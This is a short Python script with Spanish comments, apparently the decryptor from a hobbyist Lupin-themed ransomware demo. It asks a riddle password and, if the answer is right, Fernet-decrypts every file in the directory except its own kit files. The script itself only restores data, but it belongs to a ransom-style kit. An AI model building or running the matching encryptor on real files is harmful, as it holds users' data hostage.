import os
from cryptography.fernet import Fernet

#Primero buscamos todos los archivos del dorectorio menos el propio Lupin
# Evitar que encripte también la llave con el objetivo de poder desencriptar luego los archivos

Archivos_obj=[]

for archivo in os.listdir():
    if archivo =="Lupin.py" or archivo=="laLLave.key" or archivo=="ganimard.py":
        continue
    
    #en caso de que no queramos encriptar directorios también
    #if os.path.isdir(file):
        #continue
    if os.path.isfile(archivo):
        Archivos_obj.append(archivo)
    
with open("laLLave.key","rb") as llave:
    llaveSecreta = llave.read()

password ="gentleman-cambrioleur"

user_password=input("Cual fue mi primera aventura?\n")

if user_password == password:
    #DesEncriptamos todos los archivos en nuestra lista de objetivo
    for archivo in Archivos_obj:
        with open(archivo,"rb") as ArchivoEncrypt:
            contents = ArchivoEncrypt.read() # pillamos ruta el archivo
        no_encryptado = Fernet(llaveSecreta).decrypt(contents) # desencriptamos el archivo
        with open(archivo,"wb") as ArchivoEncrypt: #  mddificamos el archivo original
            ArchivoEncrypt.write(no_encryptado)  
              
    print("Volveremos a vernos detective")
    
else:
    print("Tendrá que esforzarse mas detective")
